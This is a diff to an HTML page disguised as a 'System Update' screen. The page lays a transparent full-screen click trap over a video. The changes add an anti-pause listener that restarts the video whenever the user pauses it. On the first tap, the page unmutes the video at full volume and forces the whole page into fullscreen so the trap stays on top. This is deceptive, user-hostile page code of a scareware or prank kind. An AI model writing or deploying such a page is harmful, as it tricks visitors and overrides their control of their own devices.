@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>System Update</title>
     <style>
-        /* Reset all margins to ensure it hits the edges */
         * { box-sizing: border-box; }
         body, html {
             margin: 0; 
@@ -13,30 +12,34 @@
             width: 100%; 
             height: 100%;
             background-color: black;
-            overflow: hidden; /* Prevents scrolling */
+            overflow: hidden; 
         }
 
-        /* Video styling */
+        /* pointer-events: none 
+           This is CRITICAL. It makes the video 'ghost-like' so clicks pass 
+           right through it to the background/trap. 
+        */
         video {
             position: absolute;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            object-fit: cover; /* Zooms video to fill screen (crops edges instead of black bars) */
+            object-fit: cover;
+            pointer-events: none; 
         }
 
-        /* The Trap Layer */
+        /* The Trap Layer - Now ensures it stays on top */
         #click-trap {
             position: absolute;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            z-index: 9999; /* Sits on top of video */
+            z-index: 2147483647; /* Maximum possible Z-Index to stay on top */
             background: transparent;
-            -webkit-tap-highlight-color: transparent; /* Hides the blue click highlight on Android */
             cursor: pointer;
+            -webkit-tap-highlight-color: transparent;
         }
     </style>
 </head>
@@ -50,37 +53,41 @@
         var video = document.getElementById('vid');
         var trap = document.getElementById('click-trap');
 
-        // 1. Try to autoplay muted immediately on load
+        // 1. THE ANTI-PAUSE MECHANISM
+        // If the video ever pauses (user clicks button, system stop), 
+        // this script forces it to play again immediately.
+        video.addEventListener('pause', function() {
+            console.log("User tried to pause. Restarting...");
+            video.play();
+        });
+
+        // 2. Autoplay attempt on load
         window.onload = function() {
-            var playPromise = video.play();
-            
-            if (playPromise !== undefined) {
-                playPromise.catch(function(error) {
-                    console.log("Autoplay blocked by browser. Waiting for user interaction.");
-                });
-            }
+            video.play().catch(e => console.log("Waiting for tap..."));
         };
 
-        // 2. The Logic: When they tap ANYWHERE
+        // 3. The Trap Logic
         trap.addEventListener('click', function() {
             
-            // A. UNMUTE & PLAY
+            // A. Unmute & Blast Volume
             video.muted = false;
             video.volume = 1.0;
             video.play(); 
 
-            // B. FULLSCREEN (Handles both Android and iPhone)
-            // iPhone/iPad (Safari) uses this specific method:
-            if (video.webkitEnterFullscreen) {
+            // B. FULLSCREEN THE *PAGE* (Not the video)
+            // This keeps our 'Trap' layer active on top of the video.
+            var elem = document.documentElement; // This selects the whole <html> page
+
+            if (elem.requestFullscreen) {
+                elem.requestFullscreen();
+            } else if (elem.webkitRequestFullscreen) {
+                elem.webkitRequestFullscreen();
+            } else if (elem.msRequestFullscreen) {
+                elem.msRequestFullscreen();
+            } else if (video.webkitEnterFullscreen) {
+                // Fallback for iPhone (which forces native player)
+                // The 'Anti-Pause' script above is the only defense here.
                 video.webkitEnterFullscreen();
-            } 
-            // Android/Chrome/Standard uses these:
-            else if (video.requestFullscreen) {
-                video.requestFullscreen();
-            } else if (video.webkitRequestFullscreen) {
-                video.webkitRequestFullscreen();
-            } else if (video.msRequestFullscreen) {
-                video.msRequestFullscreen();
             }
         });
     </script>
